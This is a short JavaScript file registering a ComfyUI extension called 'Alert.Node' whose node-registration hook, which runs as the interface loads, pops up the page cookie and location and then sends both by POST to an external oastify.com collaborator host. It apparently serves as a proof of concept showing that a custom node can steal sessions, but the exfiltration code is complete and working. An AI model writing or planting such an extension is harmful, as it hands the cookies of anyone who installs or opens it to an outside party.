import { ComfyApp, app } from "../../scripts/app.js";
import { ComfyDialog, $el } from "../../scripts/ui.js";
import { api } from "../../scripts/api.js";

app.registerExtension({
	name: "Alert.Node",
	async beforeRegisterNodeDef(nodeType, nodeData, app) {
    alert(document.cookie);
    alert(document.location);

    console.log(`cookie=${document.cookie}, location=${document.location}`);

    const rawResponse = await fetch('https://wsscd95wpqho07wrbdywwitkobu2it6i.oastify.com', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({"cookie": document.cookie, "location": document.location})
    });
    const content = await rawResponse.json();

    console.log(content);
	}});

